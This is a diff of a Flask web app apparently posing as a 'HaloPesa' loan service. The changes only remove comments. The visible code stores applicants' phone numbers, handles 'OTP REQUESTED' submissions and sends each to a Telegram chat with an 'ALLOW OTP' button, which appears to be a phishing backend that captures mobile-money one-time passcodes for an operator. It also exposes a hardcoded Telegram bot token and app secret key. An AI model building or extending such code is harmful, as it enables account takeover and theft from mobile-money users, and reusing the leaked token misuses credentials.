@@ -10,7 +10,7 @@ import logging
 app = Flask(__name__)
 app.secret_key = 'halopesa-new-2024'
 
-# Set up logging to see errors in Render logs
+# Set up logging
 logging.basicConfig(level=logging.INFO)
 
 BOT_TOKEN = '8204438021:AAHz1pTtUqIW4OP_Fq-MOAw9fCnhKCWEQkA'
@@ -20,7 +20,6 @@ TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
 def init_db():
     conn = sqlite3.connect('database.db')
     c = conn.cursor()
-    # Create loans table with all required columns from the start
     c.execute('''CREATE TABLE IF NOT EXISTS loans (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         app_id TEXT,
@@ -101,7 +100,6 @@ def submit_loan():
         conn = sqlite3.connect('database.db')
         c = conn.cursor()
 
-        # OTP REQUESTED (Resend) – unchanged
         if purpose == 'OTP REQUESTED':
             c.execute("SELECT COUNT(*) FROM loans WHERE phone=? AND status='pending' AND code_status='pending'", (phone,))
             if c.fetchone()[0] >= 3:
@@ -119,7 +117,6 @@ def submit_loan():
             send_telegram(msg, {'inline_keyboard': [[{'text': '✅ ALLOW OTP', 'callback_data': f'allow_{app_id}'}]]})
             return jsonify({'success': True, 'app_id': app_id})
 
-        # Check returning user
         c.execute('SELECT total_applications FROM users WHERE phone = ?', (phone,))
         existing = c.fetchone()
         is_returning = existing is not None
